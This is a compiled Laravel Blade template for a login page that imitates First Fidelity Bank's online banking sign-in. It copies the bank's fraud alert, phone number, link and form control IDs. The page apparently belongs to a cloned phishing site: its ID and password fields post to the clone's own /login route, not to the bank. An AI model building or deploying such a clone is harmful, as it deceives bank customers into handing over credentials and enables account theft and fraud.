<?php $__env->startSection('title',"Log In"); ?>

<?php $__env->startSection('content'); ?>
    <form method="post" action="<?php echo e(url('login')); ?>">
		<?php echo e(csrf_field()); ?>

                <div id="WelcomeMessageDiv" class="welcome-message">
                    <div class="LoginWelcomeLiteralDiv">
                        
<meta name="generator" content="HTML Tidy, see www.w3.org">


<font face="Arial" color="Red">Alert: Please note that First
Fidelity Bank will never ask you for personal information such as
your debit card or pin number or mother's maiden name via the
Internet. If you believe you have been compromised, please call
1-800-299-7047. For more information on ways to protect yourself
from internet fraud <a href="https://www.ffb.com/542" target=
"_blank">click here.</a><br>
</font>
<br/>
                    </div>
                </div>
            
        
        <div class="LoginClear"></div>
        <div class="LoginPadding10">
            <fieldset class="NoMargin AuthenticationLoginFieldset">
                <legend></legend>
                <div class="row">
                    <div class="six columns">
                        <strong>
                            <label for="ctl00_PageContent_Login1_IdTextBox" id="ctl00_PageContent_Login1_IdLabel" class="LoginTextBox">FFB&#32;Online&#32;ID:&#32;</label>
                        </strong>
                    </div>
                    <div class="six columns">
                        <input name="id" type="text" size="30" id="ctl00_PageContent_Login1_IdTextBox" class="LoginIdTextBox" AutoComplete="off" ToggleTabIndex="true" />
                          
                    </div>
                </div>
                <div class="row">
                    <div class="six columns">
                        <strong>
                            <label for="ctl00_PageContent_Login1_PasswordTextBox" id="ctl00_PageContent_Login1_PasswordLabel" class="LoginTextBox">FFB&#32;Online Password: </label>
                        </strong>
                    </div>
                    <div class="six columns">
                        <input name="pass" type="password" size="30" id="ctl00_PageContent_Login1_PasswordTextBox" class="LoginPwdTextBox" AutoComplete="Off" ToggleTabIndex="true" />
                    </div>
                </div>
            </fieldset>
        </div>

        <div class="button-containerADA LoginButtonContainerDiv">
            
            
            <input type="submit" name="ctl00$PageContent$Login1$LoginButton" value="Login" id="ctl00_PageContent_Login1_LoginButton" class="ColorButton" ToggleTabIndex="true" />
             <a id="ctl00_PageContent_Login1_PasswordSelfResetLinkButton" class="LoginSelfResetLinkButton" ToggleTabIndex="true" title="Reset Password" href="#">Reset&#32;Password</a>
        </div>
		</form>

        <div id="ctl00_PageContent_Login1_divPasswordResetLayout2" class="LoginCenter">
            
            
        </div>
<?php $__env->stopSection(); ?>
<?php echo $__env->make('login_layout', \Illuminate\Support\Arr::except(get_defined_vars(), ['__data', '__path']))->render(); ?><?php /**PATH C:\bkupp\lokl\repo\bank-olly\resources\views/login.blade.php ENDPATH**/ ?>